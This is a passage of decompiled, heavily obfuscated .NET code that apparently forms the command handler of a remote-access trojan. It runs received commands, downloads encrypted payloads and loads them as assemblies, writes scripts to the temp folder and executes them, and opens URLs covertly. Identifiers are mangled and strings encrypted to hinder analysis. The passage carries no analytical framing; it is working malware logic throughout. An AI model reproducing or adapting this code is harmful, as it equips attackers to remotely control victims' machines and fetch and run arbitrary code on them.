					______________________________________________________________.______________(<Module>._____<string>(1464211711u), <Module>._______<string>(619600478u) + text);
					if ((num19 / 63952569 | 3199) == 3199)
					{
						int num34 = global::______________________._______;
						arg_1932_0 = ((num34 * 116015104 == 1225106395) ? (System.Type.EmptyTypes.Length + -208404402) : (sizeof(ushort) + 6));
						continue;
					}
					int num35;
					arg_1932_0 = ((772407296 * num5 * -260096 == 9860) ? (((num35 * 34 + 30 * num35 | -59) == -59) ? (sizeof(long) + -1627545973) : -550797686) : (sizeof(int) + 1835215106));
					continue;
					IL_BE1:
					if (Operators.CompareString(array[2], <Module>._______<string>(2794470400u), false) == 0)
					{
						goto IL_BFB;
					}
					goto IL_1EFB;
					IL_13CC:
					___________________________________________________________________ = new ____________________________________________________________________();
					___________________________________________________________________._ = array[1];
					if ((26092 ^ num3 * -536870912) != 0)
					{
						arg_1932_0 = System.Type.EmptyTypes.Length + 2;
					}
					else if ((num2 / 8388608 ^ 7796) == 0)
					{
						arg_1932_0 = sizeof(short) + 1737170524;
					}
					else
					{
						num16 = -1062840359;
						arg_1932_0 = -1062840359;
					}
				}
				global::__________________._(array[1], array[2], array[3], array[4], array[5], array[6]);
				if ((8395353 ^ ((num26 & 8290) - -1080419749 & num26)) == 0)
				{
					goto IL_2124;
				}
				if (num2 != -30314)
				{
					goto IL_2124;
				}
				Block_16:
				goto IL_2133;
				Block_25:
				num2 = -21839;
				if ((((num14 * 3 + num14 - 4164 ^ 8343) != 0) ? (System.Type.EmptyTypes.Length + 20770) : (System.Type.EmptyTypes.Length + 2019159496)) != 20770)
				{
					goto IL_2176;
				}
				System.Threading.Thread thread7 = new System.Threading.Thread(new System.Threading.ThreadStart(_________________________________________________.______));
				thread7.Start();
				goto IL_219C;
				Block_28:
				num2 = 28517;
				if ((4259 ^ num8 / 134217728) == 0)
				{
					goto IL_2367;
				}
				goto IL_21BE;
				Block_29:
				num2 = 16275;
				if (sizeof(ushort) + -9418 != -9416)
				{
					goto IL_21E6;
				}
				_______________________________._(array[1]);
				return;
				Block_30:
				num2 = System.Type.EmptyTypes.Length + -29183;
				goto IL_2207;
				Block_32:
				Block_33:
				goto IL_221B;
				Block_46:
				goto IL_2278;
				Block_48:
				goto IL_2242;
				Block_50:
				goto IL_2250;
				Block_52:
				goto IL_235C;
				Block_53:
				Block_54:
				goto IL_2255;
				Block_55:
				goto IL_22B3;
				Block_57:
				goto IL_2278;
				Block_58:
				goto IL_22FC;
				Block_96:
				goto IL_20CC;
				Block_97:
				goto IL_1BA5;
				Block_101:
				num2 = 4578;
				______________________________________________________________.___________(<Module>.____<string>(1816301751u) + _____________________________________________________________________.___(array[1]));
				goto IL_2091;
				Block_103:
				num2 = -651;
				if (System.Type.EmptyTypes.Length + -23987 != -23987)
				{
					goto IL_236F;
				}
				goto IL_1CE4;
				Block_106:
				goto IL_1BFE;
				Block_107:
				goto IL_1C11;
				Block_113:
				num2 = -24827;
				if (sizeof(int) + 8516 != 8520)
				{
					goto IL_1C39;
				}
				global::___________________.__();
				return;
				Block_119:
				num8 = 63;
				goto IL_2096;
				Block_120:
				num2 = 26199;
				if (sizeof(ushort) + -19447 != 22490)
				{
					goto IL_2036;
				}
				goto IL_1F70;
				Block_130:
				num2 = -13624;
				if ((num12 * 1677568 & 76) != 0)
				{
					goto IL_1F61;
				}
				_________________________________________________________________________________ object3 = new _________________________________________________________________________________();
				System.Threading.Thread thread8 = new System.Threading.Thread(new System.Threading.ThreadStart(object3.____________));
				if (num2 != -8305)
				{
					thread8.Start();
					return;
				}
				goto IL_22FC;
				Block_132:
				num2 = -4496;
				if (sizeof(int) + 18018 != 18022)
				{
					goto IL_1CE4;
				}
				if (!array[1].Contains(global::______________________._____))
				{
					goto IL_231F;
				}
				global::____________________.___________(array[1]);
				if (num2 != -4496)
				{
					goto IL_219C;
				}
				if (((3423 & num5) - -8064 ^ 16784287) == 0)
				{
					goto IL_219C;
				}
				return;
				Block_153:
				num2 = -22176;
				if (sizeof(int) + 16526 != 16530)
				{
					goto IL_1F75;
				}
				global::___________________._______();
				return;
				Block_154:
				num2 = 19292;
				if ((num30 * 2048 & -1589723136) != (-1589723136 & num30 << 11))
				{
					goto IL_2176;
				}
				global::___________________.___________(array[1]);
				return;
				Block_158:
				num2 = -4432;
				int num36 = global::______________________._______;
				int arg_1E76_0;
				if ((num36 % 4036271 ^ 8390091) != 0)
				{
					arg_1E76_0 = 11943;
				}
				else
				{
					int num29 = <Module>.______________;
					if ((num29 / 67108864 - 8380 & 467152128) != 467143936)
					{
						int num37 = <Module>.___________;
						int arg_1E47_0 = (num37 * 14 + 2 * num37) * 2048 - 75587584;
						int num35 = <Module>.________________;
						arg_1E76_0 = ((arg_1E47_0 == num35 * 909639680) ? (System.Type.EmptyTypes.Length + 306113298) : (System.Type.EmptyTypes.Length + 1668462087));
					}
					else
					{
						arg_1E76_0 = System.Type.EmptyTypes.Length + 2140064777;
					}
				}
				if (arg_1E76_0 == 11943)
				{
					goto IL_1F3A;
				}
				IL_1A68:
				return;
				IL_1A6D:
				thread5.Start();
				IL_1A79:
				IL_1A7E:
				return;
				IL_1A83:
				global::______________________.________(______________________________________________________________._______________________ + <Module>.____<string>(1457469466u));
				IL_1AA1:
				return;
				IL_1AA6:
				__________________________________ object4 = new __________________________________();
				System.Threading.Thread thread9 = new System.Threading.Thread(new System.Threading.ThreadStart(object4._______));
				if (num2 != -6190)
				{
					goto IL_20CC;
				}
				thread9.Start();
				return;
				IL_1ADC:
				______________________________________________________________.___________(<Module>._______<string>(2150552932u) + global::___________________._____() + <Module>.____<string>(3008796200u));
				num13 = global::______________________._______;
				IL_1B0B:
				return;
				IL_1B10:
				System.IO.File.WriteAllBytes(array[1], bytes);
				IL_1B20:
				return;
				IL_1B25:
				global::____________________.___(array[1]);
				return;
				IL_1B33:
				______________________________________________._ = false;
				return;
				IL_1B3E:
				______________________________________________________________.__________________(array[1], array[2], false);
				if (num2 == 28070)
				{
					goto IL_2044;
				}
				IL_1B5D:
				return;
				IL_1B62:
				_________________________________________________.___________(array[1]);
				return;
				IL_1B70:
				global::____________________._________(array[1]);
				IL_1B7E:
				return;
				IL_1B83:
				global::___________________._();
				return;
				IL_1B8D:
				System.IO.File.Delete(global::______________________.___ + array[1]);
				return;
				IL_1BA5:
				_______________________________________________.__(array[1]);
				return;
				IL_1BFE:
				global::____________________.__(array[1], array[2], false);
				goto IL_222F;
				IL_1C11:
				global::____________________.____(array[1]);
				return;
				IL_1C39:
				global::___________________.____(array[1]);
				return;
				IL_1CE4:
				global::____________________._____(array[1], array[2]);
				if (num2 != -651)
				{
					goto IL_2096;
				}
				goto IL_21E6;
				IL_1D4D:
				______________________________________________________________.___________(<Module>._____<string>(2333479949u) + _________________________________________________________________.______________() + <Module>.____<string>(3008796200u));
				goto IL_1F70;
				IL_1E80:
				thread4.Start();
				IL_1E8C:
				IL_1E91:
				return;
				IL_1E96:
				____________________________________ ___________________________________ = new ____________________________________();
				___________________________________._ = array[1];
				num2 = 25929;
				IL_1EAF:
				System.Threading.Thread thread10 = new System.Threading.Thread(new System.Threading.ThreadStart(___________________________________._));
				thread10.Start();
				if (num2 == -20737)
				{
					int num20;
					if ((num20 + num20) / 7338 != -2059906234)
					{
						goto IL_1EED;
					}
				}
				return;
				IL_1EED:
				_________________________________________________________________._____(array[1]);
				return;
				IL_1EFB:
				______________________________________________________________.______________(<Module>.____<string>(3395602991u), <Module>.___<string>(3821465187u) + text);
				num2 = 15567;
				if (System.Type.EmptyTypes.Length + 16305 != -11071)
				{
					return;
				}
				IL_1F3A:
				global::__________________._ += array[1];
				return;
				IL_1F52:
				______________________________________________________________.__.Close();
				return;
				IL_1F61:
				Process.Start(array[1]);
				IL_1F70:
				return;
				IL_1F75:
				string text4 = _____________________________________________________________________.____(array[1]);
				if (Operators.CompareString(text4, <Module>.____<string>(372314799u), false) != 0)
				{
					int num7 = num2;
					num2 = 14451;
					int num38;
					if (43 * num38 + 85 * num38 != 974290426)
					{
						if (num7 == 31326)
						{
							goto IL_2036;
						}
					}
					______________________________________________________________.___________(<Module>._______<string>(987635703u) + text4 + <Module>.______<string>(861631917u));
					if (num2 == 21896)
					{
						int num3;
						if (((~((1874150872 & num3) - 1875) ^ 5309) & 3) == 3)
						{
							goto IL_200A;
						}
					}
				}
				return;
				IL_200A:
				______________________________________________________________.___________(<Module>.____<string>(2959865172u) + global::___________________.______(array[1]) + <Module>.___<string>(2677394803u));
				goto IL_2365;
				IL_2036:
				global::____________________.___________(array[1]);
				return;
				IL_2044:
				__________________________________________________________________._____(<Module>._______<string>(3848501920u), <Module>._____<string>(142639785u));
				______________________________________________________________.______________(<Module>._____<string>(3623611337u), <Module>._______<string>(3967402460u));
				if (num2 != 9665)
				{
					return;
				}
				goto IL_2207;
				IL_2087:
				_____________________________________________________________________________.____________();
				IL_2091:
				return;
				IL_2096:
				global::____________________.__________(array[1]);
				return;
				IL_20A4:
				System.Threading.Thread thread11 = new System.Threading.Thread(new System.Threading.ThreadStart(new ________________________________________________
				{
					_ = string_0
				}._));
				goto IL_2367;
				IL_20CC:
				global::____________________.________();
				return;
				IL_20D6:
				thread2.Start();
				return;
				IL_2124:
				global::______________________.______();
				IL_2133:
				return;
				IL_2176:
				thread.Start();
				IL_219C:
				return;
				IL_21BE:
				______________________________________________._(array[1]);
				IL_21E6:
				return;
				IL_2207:
				_________________________________________________._______(System.Convert.ToInt32(array[1]), false);
				return;
				IL_221B:
				_________________________________________________._______(System.Convert.ToInt32(array[1]), true);
				IL_222F:
				return;
				IL_2234:
				global::______________________.________(array[1]);
				return;
				IL_2242:
				_________________________________________________________________._ = array[1];
				IL_2250:
				IL_2255:
				return;
				IL_225A:
				______________________________________________________________.______________(<Module>.______<string>(2655866516u), <Module>._____<string>(327195795u));
				return;
				IL_2278:
				System.Random random2 = new System.Random();
				string arg_22AC_0 = System.IO.Path.GetTempPath();
				num = random2.Next(1000, 9000);
				string text5 = arg_22AC_0 + num.ToString() + <Module>.____<string>(2682857905u) + array[1];
				IL_22B3:
				string[] array3 = Strings.Split(string_0, <Module>.______<string>(2507809651u), -1, CompareMethod.Binary);
				System.IO.File.WriteAllText(text5, array3[1]);
				Process.Start(text5);
				______________________________________________________________.______________(<Module>.____<string>(3395602991u), <Module>._______<string>(3274729611u) + text5);
				IL_22FC:
				return;
				IL_2301:
				______________________________________________________________.______________(<Module>.______<string>(2655866516u), <Module>.___<string>(736611324u));
				IL_231F:
				return;
				IL_2324:
				text3 = <Module>.______<string>(755090443u);
				IL_2330:
				System.Threading.Thread.Sleep(250);
				______________________________________________________________.___________(<Module>.____<string>(547721682u) + text3 + <Module>._____<string>(1052623516u));
				IL_235A:
				return;
				IL_235C:
				thread3.Start();
				IL_2365:
				return;
				IL_2367:
				thread11.Start();
				IL_236F:;
			}
		}
		catch (System.Exception expr_2371)
		{
			ProjectData.SetProjectError(expr_2371);
			System.Exception ex = expr_2371;
			______________________________________________________________.______________(<Module>._____<string>(2571642080u), <Module>._______<string>(4225233202u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void ______________________(string string_0)
	{
		try
		{
			if (14807 == System.Type.EmptyTypes.Length + 14807)
			{
				string path = global::______________________.____ + ______________________________________________________________._______________________ + <Module>.___<string>(697590686u);
				if (!System.IO.File.Exists(path))
				{
					byte[] byte_2;
					if (System.Type.EmptyTypes.Length + 15368 != -6984)
					{
						WebClient webClient = new WebClient();
						byte[] byte_ = webClient.DownloadData(string_0);
						byte_2 = ___________________________________________________________________._______(byte_, <Module>.____<string>(251397721u));
					}
					byte[] array = ________________________________________________________________________________.______(byte_2);
					if (array.Length != 82438)
					{
						string arg_DC_0 = <Module>.____<string>(1187660804u);
						string arg_DC_1 = <Module>.______<string>(3786824459u);
						global::___________._ = -1932913121;
						______________________________________________________________.______________(arg_DC_0, arg_DC_1);
						return;
					}
					System.IO.File.WriteAllBytes(path, ___________________________________________________________________._______(array, <Module>.__________(sizeof(short) + 29789, System.Type.EmptyTypes.Length + 29140, System.Type.EmptyTypes.Length + 185)));
				}
			}
			_______________________________________________._ = true;
		}
		catch (System.Exception expr_EB)
		{
			ProjectData.SetProjectError(expr_EB);
			System.Exception ex = expr_EB;
			______________________________________________________________.______________(<Module>._______<string>(2357608790u), <Module>._______<string>(1592812621u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	private static System.Reflection.Assembly _______________________(object object_0, System.ResolveEventArgs resolveEventArgs_0)
	{
		System.Reflection.Assembly result;
		try
		{
			int num = <Module>._________________;
			if (num * 618624 != -1581)
			{
				System.Reflection.AssemblyName assemblyName = new System.Reflection.AssemblyName(resolveEventArgs_0.Name);
				int num2;
				System.Array array;
				int arg_241_0;
				if (assemblyName.Name.Contains(<Module>.____<string>(2102967365u)))
				{
					if (System.Type.EmptyTypes.Length + 30647 != 30647)
					{
						goto IL_2F3;
					}
					goto IL_1C1;
				}
				else
				{
					if (!_______________________________________________._)
					{
						return result;
					}
					byte[] arg_168_0 = System.IO.File.ReadAllBytes(global::______________________.____ + ______________________________________________________________._______________________ + <Module>.___<string>(697590686u));
					int arg_163_0;
					if (2077229056 * num2 * (num2 % 8192) != -7802)
					{
						arg_163_0 = 22952;
					}
					else if (3473 + (num2 - 9987 | 67 * num2 + num2 * 61) == ~num2)
					{
						if ((-3 | num2 * 3 + num2 - 2636) == -3)
						{
							if (num2 * 779 + num2 * 245 == -1746265770)
							{
								int arg_FE_0 = 1073740712;
								int num3 = <Module>._______________;
								arg_163_0 = (((-(arg_FE_0 & num3) ^ 7228) == 0) ? checked((int)-1950083533.0) : (System.Type.EmptyTypes.Length + -1359128622));
							}
							else
							{
								arg_163_0 = System.Type.EmptyTypes.Length + -1729275948;
							}
						}
						else
						{
							arg_163_0 = System.Type.EmptyTypes.Length + -1225301400;
						}
					}
					else
					{
						arg_163_0 = System.Type.EmptyTypes.Length + 1026787821;
					}
					array = global::_____________________________.____________(___________________________________________________________________._______(arg_168_0, <Module>.__________(arg_163_0, System.Type.EmptyTypes.Length + 24312, sizeof(short) + 197)), <Module>._____<string>(3643921929u));
					if (System.Type.EmptyTypes.Length + -22118 == 12434)
					{
						goto IL_1C1;
					}
					byte[] arg_1B2_0 = (byte[])NewLateBinding.LateIndexGet(array, new object[]
					{
						0
					}, null);
					arg_241_0 = sizeof(int) + -2;
				}
				while (true)
				{
					IL_241:
					switch (arg_241_0)
					{
					case 0:
						if (assemblyName.Name.ToLower().Contains(<Module>.____<string>(1033029822u)))
						{
							arg_241_0 = System.Type.EmptyTypes.Length + 3;
							continue;
						}
						goto IL_25B;
					case 2:
					{
						byte[] arg_210_0 = (byte[])NewLateBinding.LateIndexGet(array, new object[]
						{
							1
						}, null);
						arg_241_0 = sizeof(ushort) + -2;
						continue;
					}
					case 3:
						goto IL_2F8;
					}
					break;
				}
				goto IL_2F3;
				IL_25B:
				object arg_2B2_0 = null;
				System.Type arg_2B2_1 = typeof(System.Reflection.Assembly);
				string arg_2B2_2 = <Module>.______<string>(131364567u);
				object[] array2 = new object[1];
				object[] arg_29F_0 = array2;
				int arg_29F_1 = 0;
				object arg_295_0 = array;
				object[] array3 = new object[1];
				object[] arg_291_0 = array3;
				int arg_291_1 = 0;
				num2 = 1;
				arg_291_0[arg_291_1] = 1;
				arg_29F_0[arg_29F_1] = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(arg_295_0, array3, null));
				object[] array4 = array2;
				object[] arg_2B2_3 = array4;
				string[] arg_2B2_4 = null;
				System.Type[] arg_2B2_5 = null;
				bool[] array5 = new bool[]
				{
					true
				};
				object arg_2E7_0 = NewLateBinding.LateGet(arg_2B2_0, arg_2B2_1, arg_2B2_2, arg_2B2_3, arg_2B2_4, arg_2B2_5, array5);
				if (array5[0])
				{
					NewLateBinding.LateIndexSetComplex(array, new object[]
					{
						num2,
						System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(array4[0])
					}, null, true, false);
				}
				result = (System.Reflection.Assembly)arg_2E7_0;
				return result;
				IL_2F8:
				object arg_34E_0 = null;
				System.Type arg_34E_1 = typeof(System.Reflection.Assembly);
				string arg_34E_2 = <Module>.___<string>(2613430401u);
				array4 = new object[1];
				object[] arg_33A_0 = array4;
				int arg_33A_1 = 0;
				object arg_330_0 = array;
				object[] array6 = new object[1];
				object[] arg_32C_0 = array6;
				int arg_32C_1 = 0;
				num2 = 0;
				arg_32C_0[arg_32C_1] = 0;
				arg_33A_0[arg_33A_1] = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(arg_330_0, array6, null));
				array2 = array4;
				object[] arg_34E_3 = array2;
				string[] arg_34E_4 = null;
				System.Type[] arg_34E_5 = null;
				array5 = new bool[]
				{
					true
				};
				object arg_384_0 = NewLateBinding.LateGet(arg_34E_0, arg_34E_1, arg_34E_2, arg_34E_3, arg_34E_4, arg_34E_5, array5);
				if (array5[0])
				{
					NewLateBinding.LateIndexSetComplex(array, new object[]
					{
						num2,
						System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(array2[0])
					}, null, true, false);
				}
				result = (System.Reflection.Assembly)arg_384_0;
				return result;
				IL_1C1:
				byte[] byte_ = ___________________________________________________________________._______(__________________________________________________________________________.______, <Module>.___<string>(2290872062u));
				result = System.Reflection.Assembly.Load(________________________________________________________________________________.______(byte_));
				arg_241_0 = System.Type.EmptyTypes.Length + 1;
				goto IL_241;
			}
			IL_2F3:;
		}
		catch (System.Exception arg_38F_0)
		{
			ProjectData.SetProjectError(arg_38F_0);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void ________________________(string string_0, string string_1, string string_2)
	{
		try
		{
			int arg_1A_0 = 5245;
			int arg_13_0 = -926941184;
			int num = global::______________________._______;
			if ((arg_1A_0 | arg_13_0 * num * 2013265920) != 5245)
			{
				goto IL_3B7;
			}
			int arg_34E_0;
			if (Operators.CompareString(string_1, <Module>._______<string>(587536482u), false) == 0)
			{
				arg_34E_0 = sizeof(float) + -2;
				goto IL_34E;
			}
			int num2;
			if (Operators.CompareString(string_1, <Module>._______<string>(2817178952u), false) == 0)
			{
				num2 = System.Type.EmptyTypes.Length + 30416;
				arg_34E_0 = System.Type.EmptyTypes.Length + 0;
				goto IL_34E;
			}
			if (Operators.CompareString(string_1, <Module>._______<string>(642309030u), false) == 0)
			{
				num2 = 26953;
				int num3;
				int arg_FF_0;
				if ((52u & ((uint)(num3 * 1048576) >> 3 ^ (uint)(-(uint)(2204416 * num3)))) == 0u)
				{
					arg_FF_0 = System.Type.EmptyTypes.Length + -31435;
				}
				else
				{
					int num4 = <Module>._______________;
					arg_FF_0 = ((num4 * 290 + 1758 * num4 == -5240) ? (System.Type.EmptyTypes.Length + -1115912675) : (sizeof(short) + -1444927161));
				}
				if (arg_FF_0 != 28852)
				{
					goto IL_202;
				}
				goto IL_386;
			}
			else if (Operators.CompareString(string_1, <Module>.___<string>(3884153438u), false) == 0)
			{
				num2 = -26473;
				if ((-805306369 | (num / 16 ^ 1388)) == -805306369)
				{
					goto IL_3B7;
				}
				goto IL_386;
			}
			IL_145:
			______________________________________________________________.______________(<Module>.___<string>(982404538u), <Module>._______<string>(2195310649u) + string_0);
			num2 = -18512;
			int num5;
			int arg_1D8_0;
			if (253820928 * num5 == 1686 && (1996488704 & num5 / 562) != 0)
			{
				arg_1D8_0 = System.Type.EmptyTypes.Length + 1329576031;
			}
			else
			{
				int num6 = <Module>._____________;
				arg_1D8_0 = ((num6 + -4933 == num6 % 2) ? (sizeof(double) + -2146986324) : (((24144 ^ (num | -7605) * 385024) == 0) ? (System.Type.EmptyTypes.Length + -401140455) : (System.Type.EmptyTypes.Length + -26473)));
			}
			int i;
			if (arg_1D8_0 != -2794)
			{
				if (Operators.CompareString(string_2, <Module>.____<string>(744724380u), false) == 0)
				{
					if (num2 != -18512)
					{
						goto IL_3B7;
					}
					while (i < 100)
					{
						i++;
						_____________________________________________________________ ____________________________________________________________ = new _____________________________________________________________();
						______________________________________________________________.SendMessageW(____________________________________________________________.Handle, 793, ____________________________________________________________.Handle, (System.IntPtr)589824);
					}
				}
				return;
			}
			IL_202:
			object arg_266_0 = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(Interaction.CreateObject(<Module>.____<string>(2884599466u), <Module>.__________(sizeof(int) + 10488, sizeof(ushort) + 11883, System.Type.EmptyTypes.Length + 114)));
			__________________________________.____________ = <Module>.__________(System.Type.EmptyTypes.Length + 36861, System.Type.EmptyTypes.Length + 38415, System.Type.EmptyTypes.Length + 0);
			object obj = arg_266_0;
			num2 = -20261;
			object[] array;
			bool[] array2;
			if ((7 * i + i | -5) == -5)
			{
				object arg_2AB_0 = obj;
				System.Type arg_2AB_1 = null;
				string arg_2AB_2 = <Module>._____<string>(3400289134u);
				array = new object[]
				{
					string_0
				};
				object[] arg_2AB_3 = array;
				string[] arg_2AB_4 = null;
				System.Type[] arg_2AB_5 = null;
				array2 = new bool[]
				{
					true
				};
				NewLateBinding.LateCall(arg_2AB_0, arg_2AB_1, arg_2AB_2, arg_2AB_3, arg_2AB_4, arg_2AB_5, array2, true);
				int num3 = num2;
				num2 = -8397;
				if (num3 != -20261)
				{
					goto IL_361;
				}
				int arg_2D9_0 = 2;
				int arg_2D5_0 = 3;
				num5 = <Module>._______________;
				if ((arg_2D9_0 & arg_2D5_0 * num5 + num5 & num5) != (int)((uint)(-(uint)((uint)num5 << 7)) >> 2 & 2u))
				{
					goto IL_361;
				}
			}
			if (array2[0])
			{
				string_0 = (string)Conversions.ChangeType(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
				if (num2 != -8397)
				{
					goto IL_3B7;
				}
			}
			object arg_341_0 = obj;
			System.Type arg_341_1 = null;
			string arg_341_2 = <Module>.______<string>(770871971u);
			array = new object[]
			{
				false
			};
			NewLateBinding.LateSet(arg_341_0, arg_341_1, arg_341_2, array, null, null);
			arg_34E_0 = System.Type.EmptyTypes.Length + 1;
			IL_34E:
			switch (arg_34E_0)
			{
			case 0:
				IL_361:
				new WebBrowser
				{
					ScriptErrorsSuppressed = true
				}.Navigate(string_0);
				if (num2 != 30416)
				{
					goto IL_145;
				}
				goto IL_145;
			case 1:
				goto IL_145;
			}
			IL_386:
			Process.Start(string_0);
			goto IL_145;
			IL_3B7:
			WebClient webClient = new WebClient();
			webClient.DownloadString(string_0);
			goto IL_145;
		}
		catch (System.Exception expr_401)
		{
			ProjectData.SetProjectError(expr_401);
			System.Exception ex = expr_401;
			______________________________________________________________.______________(<Module>.______<string>(3474929201u), <Module>.______<string>(3731556791u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	[System.Runtime.InteropServices.DllImport("user32.dll")]
	public static extern System.IntPtr SendMessageW(System.IntPtr intptr_0, int int_0, System.IntPtr intptr_1, System.IntPtr intptr_2);

	[System.Runtime.InteropServices.DllImport("kernel32.dll")]
	public static extern uint SetThreadExecutionState(uint uint_0);

	[System.Diagnostics.DebuggerStepThrough]
	private static void ___________________________(object sender, ElapsedEventArgs e)
	{
		_____________________________________________________________________________._();
	}

	[System.Diagnostics.DebuggerStepThrough]
	private static void ____________________________(object sender, ElapsedEventArgs e)
	{
		______________________________________________________________.________();
	}

	[System.Diagnostics.DebuggerStepThrough]
	private static void _____________________________(object sender, System.UnhandledExceptionEventArgs e)
	{
		______________________________________________________________.____________________();
	}

	[System.Diagnostics.DebuggerStepThrough]
	private static void ______________________________()
	{
		_________________________________________________.___();
	}
}
